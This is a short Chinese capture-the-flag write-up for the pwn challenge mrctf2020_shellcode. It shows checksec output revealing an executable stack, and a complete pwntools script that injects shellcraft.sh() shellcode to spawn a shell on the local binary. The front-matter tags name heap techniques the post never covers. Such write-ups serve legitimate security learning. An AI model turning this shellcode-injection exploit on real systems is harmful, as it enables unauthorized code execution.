---
title: '{文件名}'
date: 2024-11-11 13:00:00 +0800
categories: [uaf,malloc_hook,unsortbin_leaklibc]
tags: [ctf,pwn]
---
![image-20240101170437978](../assets/img/old_imgs/image-20240101170437978.png)

- `pwntools`中`shellcode`使用与配置

```shell
bamuwe@qianenzhao:~$ checksec mrctf2020_shellcode
[*] '/home/bamuwe/mrctf2020_shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

> 没有开启`NX`

1. 没有开启`NX`考虑往栈上直接写入代码
2. `ida`和动态调试都发现`buf`栈空间为`0x410`足够写入`shellcode`

```python
from pwn import *
context(arch='amd64',log_level='debug')
#io = gdb.debug('./mrctf2020_shellcode','break main')
io = process('./mrctf2020_shellcode')
payload = asm(shellcraft.sh())
io.sendlineafter(b'Show me your magic!\n',payload)
io.interactive()
```

一开始没加`context`那一行报了`EOF`错误,是因为`shellcraft.sh()`默认生成的是`32`位`shellcode`,我们需要给他配置一下环境.

> 参考:[能坑我，但没有完全坑我——mrctf2020_shellcode - Haokunnnnnnnna - 博客园 (cnblogs.com)](https://www.cnblogs.com/p201921420037/p/14646604.html)

